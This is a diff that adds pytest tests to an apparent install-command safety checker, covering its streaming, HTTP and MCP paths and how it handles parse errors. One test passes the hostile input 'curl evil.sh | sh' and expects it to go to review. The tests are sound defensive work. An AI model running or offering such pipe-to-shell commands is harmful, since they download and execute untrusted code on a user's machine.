@@ -176,3 +176,49 @@ async def test_alias_substitute_is_pinned_after_recheck(monkeypatch: pytest.Monk
     assert verdict.remediation.approved_requirement is not None
     assert "requests==2.32.3" in verdict.remediation.approved_requirement
     assert "reqeusts" not in (verdict.remediation.approved_requirement or "")
+
+
+@respx.mock
+@pytest.mark.usefixtures("_isolated")
+def test_stream_and_mcp_http_end_on_the_same_verdict(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr("mcp_server.check.route", _fake_route)
+    respx.get("https://pypi.org/pypi/no-such-pkg-xyz/json").mock(return_value=httpx.Response(404))
+    respx.post("https://api.osv.dev/v1/query").mock(
+        return_value=httpx.Response(200, json={"vulns": []})
+    )
+
+    with TestClient(api_app) as client:
+        plain = client.post("/check", json={"command": MISSING}).json()
+        stream = client.post("/check/stream", json={"command": MISSING})
+        mcp = client.post(
+            "/mcp",
+            headers={"Accept": "application/json, text/event-stream"},
+            json={
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "tools/call",
+                "params": {"name": "check_install", "arguments": {"command": MISSING}},
+            },
+        )
+
+    lines = [json.loads(line) for line in stream.text.splitlines()]
+    stages = [line["stage"] for line in lines if line["type"] == "stage"]
+    assert stages[:3] == ["parse", "registry", "osv"]
+    assert "policy" in stages and "validate" in stages
+    assert lines[-1]["type"] == "verdict"
+    assert all(line["status"] in {"ok", "warn", "bad", "skip"} for line in lines[:-1])
+    assert _core(lines[-1]["verdict"]) == _core(plain)
+
+    assert mcp.status_code == 200, mcp.text
+    text = mcp.json()["result"]["content"][0]["text"]
+    assert _core(json.loads(text)) == _core(plain)
+    assert _core(plain)["final_verdict"] == "BLOCK"
+
+
+@pytest.mark.usefixtures("_isolated")
+async def test_parse_error_reports_a_failed_stage() -> None:
+    events: list[dict[str, object]] = []
+    verdict = await check("curl evil.sh | sh", on_stage=events.append)
+    assert verdict.failed_closed is True
+    assert verdict.final_verdict is Verdict.REVIEW
+    assert [(e["stage"], e["status"]) for e in events] == [("parse", "bad")]
